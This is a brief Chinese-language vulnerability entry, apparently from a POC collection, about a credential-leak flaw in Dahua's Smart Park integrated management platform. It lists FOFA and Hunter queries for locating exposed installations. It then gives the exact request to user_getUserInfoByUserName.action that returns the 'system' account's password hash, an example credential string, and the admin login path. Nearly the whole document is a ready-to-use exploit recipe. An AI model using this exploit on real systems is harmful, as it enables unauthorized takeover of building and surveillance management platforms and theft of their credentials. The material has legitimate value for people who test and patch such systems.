# 大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 账号密码泄漏漏洞

## 网络测绘

fofa: app="dahua-智慧园区综合管理平台"

hunter: app.name="Dahua 大华 智慧园区管理平台"

## POC / EXP

```
/admin/user_getUserInfoByUserName.action?userName=system

1ebe47fb5b1299c1ecc061e248450b83
system:dss:Admin123
```

```
/admin/login_login.action
```